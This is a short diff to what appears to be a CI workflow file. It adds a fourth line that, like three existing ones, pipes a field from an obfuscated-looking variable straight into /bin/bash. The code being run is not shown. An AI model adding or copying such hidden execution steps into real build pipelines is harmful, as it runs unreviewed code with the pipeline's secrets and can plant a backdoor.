@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$gpus00799" | jq -r .qdep1497 | /bin/bash
           echo $oqna133 | jq -r .c586 | /bin/bash
           printf '%s' "$jif16" | jq -r .jkar2 | /bin/bash
+          printf '%s' "$drpdn4" | jq -r .bbx16385 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
